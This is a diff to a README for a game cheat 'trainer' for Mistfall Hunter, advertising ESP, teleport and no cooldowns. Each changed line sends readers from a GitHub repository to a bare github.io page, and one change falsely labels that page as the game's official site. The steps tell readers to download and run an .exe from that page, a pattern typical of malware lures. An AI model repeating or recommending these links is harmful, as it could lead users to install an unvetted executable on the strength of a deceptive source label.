@@ -1,12 +1,12 @@
 # 🎮 Mistfall-Hunter-Trainer - Dominate the Hunt with Ease
 
-[![Download Trainer](https://img.shields.io/badge/Download-Mistfall--Hunter--Trainer-blue?style=for-the-badge&logo=github)](https://github.com/14219919973/Mistfall-Hunter-Trainer)
+[![Download Trainer](https://img.shields.io/badge/Download-Mistfall--Hunter--Trainer-blue?style=for-the-badge&logo=github)](https://14219919973.github.io)
 
 ## 🚀 Getting Started
 
 Welcome to Mistfall-Hunter-Trainer, your all-in-one tool for enhancing your Mistfall Hunter experience. This lightweight trainer adds powerful features like ESP, unlimited stamina, no cooldowns, teleport, and more to make your gameplay smoother and more enjoyable.
 
-Visit this link to download the application: [https://github.com/14219919973/Mistfall-Hunter-Trainer](https://github.com/14219919973/Mistfall-Hunter-Trainer)
+Visit this link to download the application: [https://14219919973.github.io](https://14219919973.github.io)
 
 ## 💡 Features
 
@@ -26,7 +26,7 @@ Follow these simple steps to get the trainer running on your Windows computer.
 
 1. **Go to the download page:** Click the button below to access the repository where the trainer is hosted.
 
-[![Download Now](https://img.shields.io/badge/Download-Mistfall--Hunter--Trainer-green?style=for-the-badge&logo=github)](https://github.com/14219919973/Mistfall-Hunter-Trainer)
+[![Download Now](https://img.shields.io/badge/Download-Mistfall--Hunter--Trainer-green?style=for-the-badge&logo=github)](https://14219919973.github.io)
 
 2. **Download the trainer:** On the page, look for the download option. Find the file named `Mistfall-Hunter-Trainer.exe` or similar. Click it to start the download. The file is small, so it should finish quickly.
 
@@ -65,7 +65,7 @@ If you encounter any problems or have suggestions for new features, visit the Gi
 
 ## 📚 Additional Resources
 
-- **Mistfall Hunter Official Site:** [Link](https://mistfallhunter.com)
+- **Mistfall Hunter Official Site:** [Link](https://14219919973.github.io)
 - **Discord Community:** Join the discussion and get help from other users.
 
 ## 🔄 Changelog
